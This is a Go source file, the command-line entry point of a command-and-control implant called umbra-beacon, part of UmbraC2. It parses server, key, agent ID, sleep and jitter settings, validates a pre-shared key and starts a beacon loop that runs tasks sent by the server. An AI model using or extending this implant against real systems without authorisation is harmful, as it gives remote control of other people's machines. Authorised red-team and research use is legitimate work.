// Command umbra-beacon is the Go implant of UmbraC2.
//
// The beacon is small on purpose: it speaks the protocol of the server,
// it runs the tasks it is given, and it says plainly what it cannot do.
// There is no module loader, no persistence and no desktop access in
// this build; the Rust and the Kotlin implants carry those.
//
// The pre-shared key comes from the environment or from the command
// line, and it is the hex key that "umbra-server -gen-psk" prints.
package main

import (
	"context"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/thesyntax1/UmbraC2/implant/go/internal/beacon"
)

// minKeyLen is the shortest key the server accepts.
const minKeyLen = 16

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "umbra-beacon: %v\n", err)
		os.Exit(1)
	}
}

// run is the body of the command, so the flags can be parsed in one
// place and every failure ends in the same message.
func run() error {
	var (
		server   = flag.String("server", os.Getenv("UMBRA_SERVER"), "the address of the server, host:port")
		pskText  = flag.String("psk", os.Getenv("UMBRA_PSK"), "the pre-shared key of the agent, in hex")
		pskFile  = flag.String("psk-file", os.Getenv("UMBRA_PSK_FILE"), "the file that holds the pre-shared key, in hex")
		id       = flag.String("id", os.Getenv("UMBRA_AGENT_ID"), "the name this implant registers under")
		sleep    = flag.Duration("sleep", 30*time.Second, "the interval between two check-ins")
		jitter   = flag.Int("jitter", 20, "the width of the jitter window, in percent")
		verbose  = flag.Bool("verbose", false, "write a line per event to the standard error")
		selfTest = flag.Bool("selftest", false, "run the offline protocol tests and exit")
		showVer  = flag.Bool("version", false, "print the version and exit")
	)
	flag.Parse()

	if *showVer {
		fmt.Printf("umbra-beacon %s (go)\n", beacon.Version)
		return nil
	}
	if *selfTest {
		if err := beacon.SelfTest(); err != nil {
			return err
		}
		fmt.Println("selftest: ok (upk, aead, session, replay protection, handshake, cycle)")
		return nil
	}

	psk, err := loadKey(*pskText, *pskFile)
	if err != nil {
		return err
	}
	log := func(string, ...any) {}
	if *verbose {
		log = func(format string, args ...any) {
			fmt.Fprintf(os.Stderr, "umbra-beacon: "+format+"\n", args...)
		}
	}
	impl, err := beacon.New(beacon.Config{
		Server:    *server,
		PSK:       psk,
		ID:        *id,
		Sleep:     *sleep,
		JitterPct: *jitter,
		Log:       log,
	})
	if err != nil {
		return err
	}
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	return impl.Run(ctx)
}

// loadKey reads the pre-shared key: from the command line, from a file
// or from the environment.
//
// The key is hex in every shape, and it has to be at least sixteen bytes
// long, which is the rule of the server as well.
func loadKey(text, path string) ([]byte, error) {
	if text == "" && path == "" {
		return nil, errors.New("the beacon needs a pre-shared key: set UMBRA_PSK or pass -psk")
	}
	raw := text
	if path != "" {
		content, err := os.ReadFile(path)
		if err != nil {
			return nil, fmt.Errorf("read the key file: %w", err)
		}
		raw = strings.TrimSpace(string(content))
	}
	key, err := hex.DecodeString(strings.TrimSpace(raw))
	if err != nil {
		return nil, fmt.Errorf("the pre-shared key is not hex: %w", err)
	}
	if len(key) < minKeyLen {
		return nil, fmt.Errorf("the pre-shared key decodes to %d bytes, it has to be at least %d", len(key), minKeyLen)
	}
	return key, nil
}
